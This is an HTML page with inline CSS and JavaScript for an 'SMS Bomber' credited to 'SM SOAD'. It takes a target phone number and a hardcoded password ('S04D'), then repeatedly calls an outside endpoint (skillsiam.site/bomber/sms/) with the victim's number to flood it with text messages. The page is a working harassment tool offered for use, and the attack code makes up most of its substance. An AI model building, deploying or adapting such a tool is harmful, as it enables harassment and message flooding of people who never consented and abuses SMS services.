<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SMS Bomber - By SM SOAD</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background-color: #000;
      height: 100vh;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-shadow: 2px 2px 4px #000;
    }

    h2 {
      font-size: 36px;
      background: linear-gradient(to right, #00ffff, #ff00ff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    label {
      font-size: 20px;
      color: #00ffcc;
    }

    input {
      padding: 10px;
      margin: 8px 0;
      border-radius: 10px;
      border: none;
      font-size: 16px;
    }

    button {
      background-color: #ff9900;
      color: black;
      padding: 10px 20px;
      font-size: 18px;
      border: none;
      border-radius: 15px;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background-color: #ff6600;
      transform: scale(1.05);
    }

    #status {
      margin-top: 20px;
      font-size: 22px;
      color: #ffffff;
    }

    .footer {
      position: absolute;
      bottom: 10px;
      text-align: center;
      width: 100%;
      font-size: 18px;
      color: #ff66cc;
    }
  </style>
</head>
<body>
  <h2>SMS Bomber (Protected)</h2>
  <label>Phone Number:</label>
  <input type="text" id="number" placeholder="01XXXXXXXXX"><br>
  <label>Password:</label>
  <input type="password" id="password" placeholder="Enter password"><br>
  <button onclick="startBombing()">Start</button>
  <p id="status"></p>

  <div class="footer">
    Developed by <strong>SM SOAD</strong>
  </div>

  <script>
    const correctPassword = "S04D"; // পাসওয়ার্ড
    const hiddenMessageCount = 5; // ইউজারকে দেখানো হবে না

    async function startBombing() {
      const number = document.getElementById('number').value;
      const password = document.getElementById('password').value;
      const status = document.getElementById('status');

      if (password !== correctPassword) {
        status.innerText = "Incorrect password!";
        return;
      }

      if (!/^01[0-9]{9}$/.test(number)) {
        status.innerText = "Invalid number!";
        return;
      }

      status.innerText = "Sending messages...";

      for (let i = 0; i < hiddenMessageCount; i++) {
        try {
          await fetch(`https://skillsiam.site/bomber/sms/?num=${number}`);
          status.innerText = `Sending to ${number} (${i + 1})`;
        } catch (err) {
          status.innerText = "Error sending. Stopped.";
          break;
        }
        await new Promise(resolve => setTimeout(resolve, 1500));
      }

      status.innerText = `Done sending to ${number}`;
      document.getElementById('number').value = '';
      document.getElementById('password').value = '';
    }
  </script>
</body>
</html>
